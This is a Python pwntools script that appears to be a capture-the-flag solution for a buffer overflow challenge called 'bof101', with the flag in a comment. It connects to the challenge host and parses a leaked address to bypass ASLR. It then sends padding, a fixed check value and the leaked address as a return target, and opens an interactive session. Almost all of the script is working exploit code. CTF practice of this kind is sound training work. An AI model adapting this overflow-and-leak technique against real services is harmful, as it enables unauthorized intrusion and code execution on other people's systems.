#!/usr/bin/env python3
#SCTF{n0w_U_R_B0F_3xpEr7}
#python3 solution.py

from pwn import *

expected = b"\x00\x00\x00\x00\xef\xbe\xad\xde\x00\x00\x00\x00\x00\x00\x00\x00"

p = remote("bof101.sstf.site", 1337, ssl=False)
#p = process("./bof101")
#raw_input("attach gdb")


leaks = p.recvuntil("What")  # return bytes
leaks = leaks.decode().split(':')   # convert byte to string
leaks = leaks[1].split('\n')
leaks = int(leaks[0], 16)
print("leaked address: ",leaks) # to defeat ASLR

p.recvuntil("name?\n:")

#pad = cyclic(512, n=8)
pad = b'A' * cyclic_find("raaaaaaa", n=8)
payload = pad + expected + p64(leaks)
print(payload)
p.sendline(payload)

p.interactive()

